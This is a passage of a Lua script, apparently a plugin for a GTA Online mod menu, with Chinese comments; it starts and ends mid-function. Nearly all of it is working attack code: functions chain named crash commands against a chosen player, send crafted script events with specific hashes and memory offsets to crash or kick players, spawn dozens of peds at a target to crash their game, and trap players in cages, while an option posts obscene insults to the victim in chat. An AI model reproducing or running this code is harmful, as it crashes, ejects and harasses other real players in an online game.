        end
        if players.exists(PlayerID) then
            menu.trigger_commands("lestercrestcrash " .. players.get_name(PlayerID))
            util.yield(3000)
        end
        if players.exists(PlayerID) then
            menu.trigger_commands("inshell " .. players.get_name(PlayerID))
        end
            util.yield(8000) 
        if players.exists(PlayerID) then
            util.toast("再等会")
            util.yield(2000)
            menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
            util.yield(2500)
            util.toast("成功移除此玩家")
    end
        else
            if players.exists(PlayerID) then
            menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
            util.yield(3000)
            end
            if players.exists(PlayerID) then
            menu.trigger_commands("lestercrestcrash " .. players.get_name(PlayerID))
            util.yield(3000)
            end
            if players.exists(PlayerID) then
            menu.trigger_commands("inshell " .. players.get_name(PlayerID))
            end
            util.yield(8000) 
            if players.exists(PlayerID) then
            util.toast("再等会")
            util.yield(2000)
            menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
            util.yield(2500)
            util.toast("成功移除此玩家")
        end
    end
end

function baibaicrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 白白崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("planecrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("planecrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function jasoncrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." Jason崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("lestercrestcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("lestercrestcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function EternityHurtcrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 街角EternityHurt崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("fragcrashclick " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("lestercrestcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("cps " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("fragcrashclick " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("lestercrestcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("cps " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function caocrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 趙先生躺平崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("dick " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("soundcrash " .. players.get_name(PlayerID) .. " 2")
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("cps " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("dick " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("soundcrash " .. players.get_name(PlayerID) .. " 2")
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("cps " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function shcrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 小涛崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("sweetcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("dongge " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("sweetcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("dongge " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function boxcrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 箱根冲冲人崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function handsomecrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 帅比昊崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function futabacrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 双叶崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function waitnightcrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 等天黑崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function xyycrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." XYY崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function mixx_crash(PlayerID)
    if nicecrash_v1 then
        menu.trigger_commands("nicecrash " .. players.get_name(PlayerID) .. " 1")
    end
    if nicecrash_v2 then
        menu.trigger_commands("nicecrash " .. players.get_name(PlayerID) .. " 2")
    end
    if nicecrash_v3 then
        menu.trigger_commands("nicecrash " .. players.get_name(PlayerID) .. " 3")
    end
    if inshell_v1 then
        menu.trigger_commands("inshell " .. players.get_name(PlayerID))
    end
    if proluna_v1 then
        menu.trigger_commands("proluna " .. players.get_name(PlayerID))
    end
    if grief_v1 then
        menu.trigger_commands("grief " .. players.get_name(PlayerID))
    end
    if nature_v1 then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
    if nature_v2 then
        menu.trigger_commands("hiroshima " .. players.get_name(PlayerID))
    end
    if sweetcrash_v1 then
        menu.trigger_commands("sweetcrash " .. players.get_name(PlayerID))
    end
    if cps_v1 then
        menu.trigger_commands("cps " .. players.get_name(PlayerID))
    end
    if fragcrash_v1 then
        menu.trigger_commands("fragcrashclick " .. players.get_name(PlayerID))
    end
    if lestercrestcrash_v1 then
        menu.trigger_commands("lestercrestcrash " .. players.get_name(PlayerID))
    end
    if dongge_v1 then
        menu.trigger_commands("dongge " .. players.get_name(PlayerID))
    end
    if planecrash_v1 then 
        menu.trigger_commands("planecrash " .. players.get_name(PlayerID))
    end
    if wenyi_v1 then
        menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
    end
    if wade_v1 then
        menu.trigger_commands("wade " .. players.get_name(PlayerID))
    end
    if OXCrash_v1 then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
    end
    if soundcrash_v1 then
        menu.trigger_commands("soundcrash " .. players.get_name(PlayerID) .. " 1")
    end
    if soundcrash_v2 then
        menu.trigger_commands("soundcrash " .. players.get_name(PlayerID) .. " 2")
    end
    if invalidmodelcrash_v1 then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
    end
    if xxx5gcrash_v1 then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
    if dick_v1 then
        menu.trigger_commands("dick " .. players.get_name(PlayerID))
    end
    if ChernobogCrash_v1 then
        menu.trigger_commands("ChernobogCrash " .. players.get_name(PlayerID) .. " 1")
    end
    if ChernobogCrash_v2 then
        menu.trigger_commands("ChernobogCrash " .. players.get_name(PlayerID) .. " 2")
    end
    if huntercrash_v1 then
        menu.trigger_commands("huntercrash " .. players.get_name(PlayerID) .. " 2")
    end
    if scriptevent_v1 then
        menu.trigger_commands("scriptevent " .. players.get_name(PlayerID) .. " 2")
    end
    if invalidclothes_v1 then
        menu.trigger_commands("invalidclothesv1 " .. players.get_name(PlayerID) .. " 2")
    end
    if invalidclothes_v2 then
        menu.trigger_commands("invalidclothesv2 " .. players.get_name(PlayerID) .. " 2")
    end
    if dh_v1 then
        menu.trigger_commands("dh " .. players.get_name(PlayerID) .. " 2")
    end
    if tuoche_v1 then
        menu.trigger_commands("tuoche " .. players.get_name(PlayerID) .. " 2")
    end
end

function lovecrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 长情崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("proluna " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("inshell " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("proluna " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("inshell " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function genercrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("proluna " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("inshell " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("proluna " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("inshell " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function bancrash(PlayerID)
    if toxicchatincrash then
    menu.trigger_commands("reportthenoob " .. players.get_name(PlayerID))
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 封号崩溃正在努力把你号给封了不用谢",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("hiroshima " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("reportthenoob " .. players.get_name(PlayerID))
        util.yield(1500)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
else
    menu.trigger_commands("reportthenoob " .. players.get_name(PlayerID))
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("hiroshima " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("reportthenoob " .. players.get_name(PlayerID))
        util.yield(1500)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
        end
    end
end


---AIO
function aaaio(PlayerID)
    if players.exists(PlayerID) then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))end
        util.yield(500)
    if players.exists(PlayerID) then
                menu.trigger_commands("wade " .. players.get_name(PlayerID))
                end
                util.yield(5000)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("dongge " .. players.get_name(PlayerID))
                end
                util.yield(1520)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("slaughter " .. players.get_name(PlayerID))
                end
                util.yield(1000)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
                end
                util.yield(390)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("tuoche " .. players.get_name(PlayerID))
                end
                util.yield(2010)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("nicecrash" .. players.get_name(PlayerID).." 1")
                end
                util.yield(2010)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("nicecrash" .. players.get_name(PlayerID).." 2")
                end
                util.yield(2010)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("nicecrash" .. players.get_name(PlayerID).." 3")
                end
                util.yield(2010)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("soundcrash" .. players.get_name(PlayerID).." 1")
                end
                util.yield(250)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("soundcrash" .. players.get_name(PlayerID).." 2")
                end
                util.yield(250)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
                end
                util.yield(500)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("nature " .. players.get_name(PlayerID))
                end
                util.yield(2500)
                if players.exists(PlayerID) then
                menu.trigger_commands("hiroshima " .. players.get_name(PlayerID))
                end
                util.yield(2500)
                if players.exists(PlayerID) then
                menu.trigger_commands("dick " .. players.get_name(PlayerID))
                end
                util.yield(5510)
                menu.trigger_commands("anticrashcam on")
                if players.exists(PlayerID) then
                menu.trigger_commands("ngcrash " .. players.get_name(PlayerID))
                end
                util.yield(5000)
                menu.trigger_commands("anticrashcam off")
                util.yield()
                if players.exists(PlayerID) then
                    util.toast("崩不掉")
              else
                    util.toast("成功移除此玩家")
                end
                util.toast("ojbk")
    end
    --脚本事件崩溃
    function scriptcrash(PlayerID)
        util.trigger_script_event(1 << PlayerID, { -555356783, PlayerID ,85952,99999,52682274855,526822745 })
        util.trigger_script_event(1 << PlayerID, { 526822748, PlayerID ,78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << PlayerID, { -66669983, PlayerID ,526822748,555555, math.random(80521,2959749521) })
        util.trigger_script_event(1 << PlayerID, { -1733737974, PlayerID ,789522 ,59486,48512151,-9545440,5845131,848153,math.random(1,2959749),189958})
        util.trigger_script_event(1 << PlayerID, { -1529596656, PlayerID ,795221,59486,48512151,-9545440 , math.random(1,2959749) })
        util.trigger_script_event(1 << PlayerID, { -8965204809, PlayerID ,795221,59486,48512151,-9545440 })
    end
    ---韦德崩
    function wadecrash(PlayerID)
        menu.trigger_commands("anticrashcam on")
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            local SpawnPed_Wade = { }
            for i = 1, 60 do
                SpawnPed_Wade[i] = CreatePed(26, util.joaat("ig_wade"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
                util.yield(1)
            end
            util.yield(5000)
            for i = 1, 60 do
                entities.delete_by_handle(SpawnPed_Wade[i])
            end
            menu.trigger_commands("anticrashcam off")
        end
        ---主机崩
        function hostcrash(PlayerID)
            local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
            menu.trigger_commands("tpmazehelipad")
            ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
            util.yield(1000)
            menu.trigger_commands("tpmazehelipad")
        end
        --传送到玩家
        function tpplayer(PlayerID)
            local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local spped = PLAYER.PLAYER_PED_ID()
                local ye = ENTITY.GET_ENTITY_COORDS(TTPed, true)
                ENTITY.SET_ENTITY_COORDS(spped, ye.x, ye.y, ye.z, true, false, false)
                util.yield(10 * math.random())
        end

------------------------------------
-------------玩家踢出---------------
------------------------------------
--阻止加入踢
function blockjoinkick(PlayerID)
    menu.trigger_commands("historyblock " .. players.get_name(PlayerID))
    menu.trigger_commands("breakup" .. players.get_name(PlayerID))
end
--智能踢
function autokickv1(PlayerID)
        util.trigger_script_event(1 << PlayerID, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << PlayerID, {0x6A16C7F, PlayerID, memory.script_global(0x2908D3 + 1 + (PlayerID * 0x1C5) + 0x13E + 0x7)})
        util.trigger_script_event(1 << PlayerID, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (PlayerID * 0x257) + 0x1FE))})
        menu.trigger_commands("breakup" .. players.get_name(PlayerID))
end
--智能踢
function autokickv2(PlayerID)
    util.trigger_script_event(1 << PlayerID, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
    util.trigger_script_event(1 << PlayerID, {0x6A16C7F, PlayerID, memory.script_global(0x2908D3 + 1 + (PlayerID * 0x1C5) + 0x13E + 0x7)})
    util.trigger_script_event(1 << PlayerID, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (PlayerID * 0x257) + 0x1FE))})
end
--静默踢
function silencekick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {421832664, PlayerID, 0, memory.read_int(memory.script_global(1951261 + 829))})
end
--美国国家航空航天局踢
function nasakick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {111242367, PlayerID, -210634234})
end
--自然死亡踢
function freemodekick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {111242367, PlayerID, memory.script_global(2689235 + 1 + (PlayerID * 453) + 318 + 7)})
end
--网络保释踢
function networkkick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {1674887089, players.user(), memory.read_int(memory.script_global(1892703 + 1 + (PlayerID * 599) + 510))})
end
--无效掉落踢
function invalidcollectiblekick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
end

------------------------------------
-------------玩家笼子---------------
------------------------------------
spawned_objects = {}
--笼子
function ptlz(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
    if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
        menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
        util.yield(300)
        if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
            notification("Failed to kick player out of the vehicle", colors.red)
            menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
            return
        end
        menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
        pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    end
    cage_player(pos)
end
--七度空间
function qdkj(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
